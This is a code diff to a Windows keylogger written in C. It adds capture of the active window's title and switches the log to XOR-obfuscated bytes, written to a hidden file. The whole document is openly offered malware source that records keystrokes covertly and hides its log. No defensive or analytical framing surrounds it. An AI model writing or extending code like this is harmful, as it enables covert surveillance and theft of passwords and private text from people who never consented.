@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <time.h>
 #include <windows.h>
 #include "types.h"
 #include "keylogger.h"
@@ -33,6 +35,7 @@ int keylogger_isShiftOn = 0;
 int keylogger_IsRunning = 0;
 char keylogger_CMD  = KEYLOGGER_CMD_NONE;
 char* keylogger_path;
+HWND keylogger_appFocus = 0;
 FILE *flog;
 
 void keylogger_PrepareToRead(void)
@@ -68,7 +71,7 @@ void keylogger_Clear(void)
 		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
 	}
 
-	fprintf(flog, "\n-={NEW}=-\n");
+	fputc(KEY_DATA_CMD_STARTED ^ KEY_DATA_XOR_KEY, flog);
 
 	keylogger_CMD  = KEYLOGGER_CMD_NONE;
 }
@@ -98,6 +101,33 @@ int key_dataPlusGet(uint8 vkey)
 	return KEY_EMPTY; //ignored; not needed ctrl, alt, esc, page up, print screen...
 }
 
+void keyb_hook_focusWindow(void)
+{
+	HWND newwin = GetForegroundWindow();
+
+	if(keylogger_appFocus != newwin)
+	{
+		int bufferLen = 255;
+		char buffer[bufferLen + sizeof(char)];
+		memset(buffer, 0, bufferLen + sizeof(char));
+
+		if(GetWindowText(newwin, buffer, bufferLen))
+		{
+			int i;
+			int buffSize = strlen(buffer);
+			fputc(KEY_DATA_CMD_FOCUSWIN ^ KEY_DATA_XOR_KEY, flog);
+			fputc(buffSize ^ KEY_DATA_XOR_KEY, flog);
+
+			for(i = 0; i != buffSize; i++)
+			{
+				fputc(buffer[i] ^ KEY_DATA_XOR_KEY, flog);
+			}
+		}
+
+		keylogger_appFocus = newwin;
+	}
+}
+
 LRESULT CALLBACK keyb_hook(int code, WPARAM wParam, LPARAM lParam)
 {
 	int specialKey = 0;
@@ -109,6 +139,8 @@ LRESULT CALLBACK keyb_hook(int code, WPARAM wParam, LPARAM lParam)
 	{
 		return CallNextHookEx(NULL, code, wParam, lParam);
 	}
+
+	keyb_hook_focusWindow();
 
 	if(wParam == WM_KEYUP)
 	{
@@ -142,7 +174,7 @@ LRESULT CALLBACK keyb_hook(int code, WPARAM wParam, LPARAM lParam)
 
 			if(keylogger_CMD == KEYLOGGER_CMD_NONE && pkey != KEY_EMPTY)
 			{
-				fputc(pkey, flog);
+				fputc(pkey ^ KEY_DATA_XOR_KEY, flog);
 				fflush(flog);
 			}
 		}
@@ -216,7 +248,7 @@ void keylogger_Start(void)
 		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
 	}
 
-	fprintf(flog, "\n-={NEW}=-\n");
+	fputc(KEY_DATA_CMD_STARTED ^ KEY_DATA_XOR_KEY, flog);
 
 	keylogger_CMD   = KEYLOGGER_CMD_NONE;
 	CreateThread(NULL, 0, keylogger_thread_loop, NULL, 0, NULL);
